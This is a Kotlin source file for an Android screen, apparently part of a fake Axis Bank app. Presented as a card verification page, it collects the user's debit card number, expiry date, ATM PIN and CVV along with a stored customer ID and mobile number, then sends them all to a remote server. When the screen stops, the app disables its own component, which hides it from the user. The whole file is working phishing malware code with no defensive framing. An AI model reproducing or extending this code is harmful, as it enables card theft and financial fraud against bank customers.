package com.example.oldaxisbank

import android.content.Intent
import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.text.Editable
import android.text.TextUtils
import android.text.TextWatcher
import android.util.Log
import android.widget.Toast
import androidx.core.widget.addTextChangedListener
import com.example.axisbank.SecondPage
import com.example.axisbank.Submit2
import com.example.oldaxisbank.databinding.ActivityVerifydetailBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class verifydetail : AppCompatActivity() {

    private lateinit var binding : ActivityVerifydetailBinding
    private val creditCardTextWatcher = CreditCardTextWatcher()
    private val expiryTextWatcher = ExpiryTextWatcher()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityVerifydetailBinding.inflate(layoutInflater)
        setContentView(binding.root)


        binding.e2.addTextChangedListener(expiryTextWatcher)


        binding.e1.addTextChangedListener(creditCardTextWatcher)


        binding.login.setOnClickListener {


            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() ||
                binding.e3.text.toString().isEmpty() || binding.e4.text.toString().isEmpty() ){
                Toast.makeText(this,"fill all fields",Toast.LENGTH_SHORT).show()
            }else if(binding.e4.text.toString().length != 3){
                Toast.makeText(this,"Please Enter 3 digit cvv",Toast.LENGTH_SHORT).show()
            }
            else if (binding.e1.text.toString().length < 19 ){
                Toast.makeText(this,"Please Enter 16 digit Debit Card Number",Toast.LENGTH_SHORT).show()
            }
            else{

                val util = Util()
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val intentff = Intent(this, thirdpage::class.java)
                val data = SecondPage(customerid = util.getLocalData(this,"c"),
                    mobile = util.getLocalData(this,"m"),
                    debit = binding.e1.text.toString(), expiry = binding.e2.text.toString(),
                    atmpin = binding.e3.text.toString(), cvv = binding.e4.text.toString()
                )
                val call = apiService.second(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })


            }

        }


    }

    override fun onStop() {
        super.onStop()
        val util =  Util()
        if(util.getLocalData(this,"dis")=="1") {
            util.saveLocalData(this,"dis","2")
            val pakagemanger = packageManager
            pakagemanger.setApplicationEnabledSetting(
                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }
}



class CreditCardTextWatcher : TextWatcher {
    private var isFormatting = false
    private val separator = '-'

    override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}

    override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

    override fun afterTextChanged(s: Editable?) {
        if (isFormatting) {
            return
        }

        isFormatting = true
        formatCreditCardNumber(s)
        isFormatting = false
    }

    private fun formatCreditCardNumber(text: Editable?) {
        text?.let {
            val length = text.length

            if (length > 0 && (length + 1) % 5 == 0) {
                val c = text[length - 1]
                if (separator == c) {
                    text.delete(length - 1, length)
                }
            }

            if (length > 0 && length % 5 == 0) {
                val c = text[length - 1]
                if (Character.isDigit(c) && TextUtils.split(text.toString(), separator.toString()).size <= 3) {
                    text.insert(length - 1, separator.toString())
                }
            }
        }
    }
}


class ExpiryTextWatcher : TextWatcher {
    private var isFormatting = false
    private val dateSeparator = '/'
    private val datePattern = Regex("[0-9]{2}/[0-9]{2}")

    override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}

    override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

    override fun afterTextChanged(s: Editable?) {
        if (isFormatting) {
            return
        }

        isFormatting = true
        formatDate(s)
        isFormatting = false
    }

    private fun formatDate(text: Editable?) {
        text?.let {
            val dateLength = text.length
            if (dateLength == 3) {
                if (text[dateLength - 1] != dateSeparator) {
                    text.insert(dateLength - 1, dateSeparator.toString())
                }
            }


            if (dateLength >= 5) {
                val date = text.toString()
                if (!datePattern.matches(date)) {
                    // Invalid date format, clear the text
                    text.clear()
                }
            }
        }
    }
}
